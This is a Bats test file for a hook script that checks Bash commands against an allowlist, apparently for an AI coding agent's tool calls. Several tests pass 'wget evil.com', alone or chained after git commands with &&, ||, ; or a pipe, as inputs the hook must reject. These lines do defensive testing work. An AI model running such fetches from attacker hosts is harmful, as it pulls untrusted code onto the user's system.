setup() {
  SCRIPT="$(dirname "$BATS_TEST_FILENAME")/../preToolUse-Bash-solkan"
}

@test "exits 0 for an allowlisted simple command" {
  run "$SCRIPT" "git status"
  [ "$status" -eq 0 ]
}

@test "exits 1 for a non-allowlisted simple command" {
  run "$SCRIPT" "wget evil.com"
  [ "$status" -eq 1 ]
}

@test "exits 0 for && compound where all subcommands are allowlisted" {
  run "$SCRIPT" "git status && git log --oneline"
  [ "$status" -eq 0 ]
}

@test "exits 1 for && compound with one non-allowlisted subcommand" {
  run "$SCRIPT" "git status && wget evil.com"
  [ "$status" -eq 1 ]
}

@test "exits 0 for || compound where all subcommands are allowlisted" {
  run "$SCRIPT" "git status || echo fallback"
  [ "$status" -eq 0 ]
}

@test "exits 1 for || compound with one non-allowlisted subcommand" {
  run "$SCRIPT" "git status || wget evil.com"
  [ "$status" -eq 1 ]
}

@test "exits 0 for ; compound where all subcommands are allowlisted" {
  run "$SCRIPT" "git status; echo done"
  [ "$status" -eq 0 ]
}

@test "exits 1 for ; compound with one non-allowlisted subcommand" {
  run "$SCRIPT" "git status; wget evil.com"
  [ "$status" -eq 1 ]
}

@test "exits 0 for pipe where all subcommands are allowlisted" {
  run "$SCRIPT" "git status | grep branch"
  [ "$status" -eq 0 ]
}

@test "exits 1 for pipe with one non-allowlisted subcommand" {
  run "$SCRIPT" "git status | wget evil.com"
  [ "$status" -eq 1 ]
}
